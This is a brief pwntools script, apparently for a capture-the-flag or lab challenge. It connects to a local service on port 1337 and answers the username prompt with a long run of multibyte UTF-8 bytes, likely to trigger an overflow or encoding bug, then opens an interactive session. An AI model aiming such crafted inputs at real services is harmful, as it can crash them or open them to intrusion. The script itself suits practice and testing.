from pwn import *

p = remote("127.0.0.1", 1337)

p.recvuntil(b"Enter your username: ")
#p.sendline(b"\x80" * 50)
p.sendline(b"\xf0\x92\x80\x80" * 50)
p.interactive()
